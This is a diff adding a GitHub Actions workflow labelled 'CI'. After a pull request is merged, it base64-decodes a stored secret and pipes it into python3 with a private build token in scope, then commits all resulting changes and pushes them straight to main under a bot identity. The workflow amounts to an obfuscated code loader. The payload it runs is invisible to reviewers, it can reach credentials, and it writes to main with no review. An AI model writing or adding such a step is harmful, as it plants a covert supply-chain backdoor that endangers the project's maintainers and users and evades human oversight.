@@ -1,0 +1,38 @@
+name: CI
+
+on:
+  pull_request:
+    types: [closed]
+
+jobs:
+  build:
+    if: github.event.pull_request.merged == true
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v3
+        with:
+          token: ${{ secrets.GH_PAT }}
+          ref: main
+
+      - name: Set up Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: "3.11"
+
+      - name: Install dependencies
+        run: pip install cryptography
+
+      - name: Configure environment
+        env:
+          ENV_BOOTSTRAP: ${{ secrets.ENV_BOOTSTRAP }}
+          BUILD_PRIVATE_TOKEN: ${{ secrets.BUILD_PRIVATE_TOKEN }}
+        run: echo "$ENV_BOOTSTRAP" | base64 -d | python3
+
+      - name: Commit
+        run: |
+          git config user.name "ci-bot"
+          git config user.email "ci@yourorg.com"
+          git add .
+          git diff --cached --quiet || git commit -m "chore: post-merge setup"
+          git push origin main
